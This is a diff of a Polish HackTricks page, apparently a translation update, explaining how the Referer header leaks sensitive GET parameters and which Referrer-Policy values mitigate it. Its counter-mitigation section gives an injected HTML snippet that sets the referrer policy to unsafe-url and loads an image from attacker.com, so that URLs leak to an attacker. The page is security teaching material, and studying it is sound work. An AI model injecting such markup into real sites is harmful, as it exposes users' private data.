@@ -1,30 +1,30 @@
 {% hint style="success" %}
-Ucz się i praktykuj Hacking AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Wesprzyj HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 
-# Nagłówki odwołań i polityka
+# Nagłówki i polityka referencji
 
-Referrer to nagłówek używany przez przeglądarki do wskazania, która była poprzednia odwiedzona strona.
+Referer to nagłówek używany przez przeglądarki do wskazania, która strona była wcześniej odwiedzana.
 
 ## Wyciek wrażliwych informacji
 
-Jeśli w pewnym momencie wewnątrz strony internetowej znajdują się jakiekolwiek wrażliwe informacje w parametrach żądania GET, jeśli strona zawiera linki do zewnętrznych źródeł lub atakujący jest w stanie sprawić/zasugerować (inżynieria społeczna), aby użytkownik odwiedził adres URL kontrolowany przez atakującego. Mógłby on wydobyć wrażliwe informacje z ostatniego żądania GET.
+Jeśli w pewnym momencie na stronie internetowej jakiekolwiek wrażliwe informacje znajdują się w parametrach żądania GET, jeśli strona zawiera linki do zewnętrznych źródeł lub atakujący jest w stanie nakłonić (inżynieria społeczna) użytkownika do odwiedzenia adresu URL kontrolowanego przez atakującego, może być w stanie wyekstrahować wrażliwe informacje z ostatniego żądania GET.
 
-## Ograniczenie
+## Łagodzenie
 
-Możesz sprawić, aby przeglądarka stosowała **politykę odwołań** (**Referrer-policy**), która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
+Możesz sprawić, że przeglądarka będzie przestrzegać **polityki referencji**, która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -35,13 +35,29 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Przeciwdziałanie
+## Counter-Mitigation
 
-Możesz zastąpić tę regułę, używając tagu meta HTML (atakujący musi wykorzystać wstrzyknięcie HTML):
+Możesz nadpisać tę regułę, używając tagu meta HTML (atakujący musi wykorzystać i wstrzyknięcie HTML):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Obrona
 
-Nigdy nie umieszczaj żadnych danych poufnych w parametrach GET ani ścieżkach w adresie URL.
+Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET lub ścieżkach w URL-u.
+
+
+{% hint style="success" %}
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Wsparcie dla HackTricks</summary>
+
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
+
+</details>
+{% endhint %}
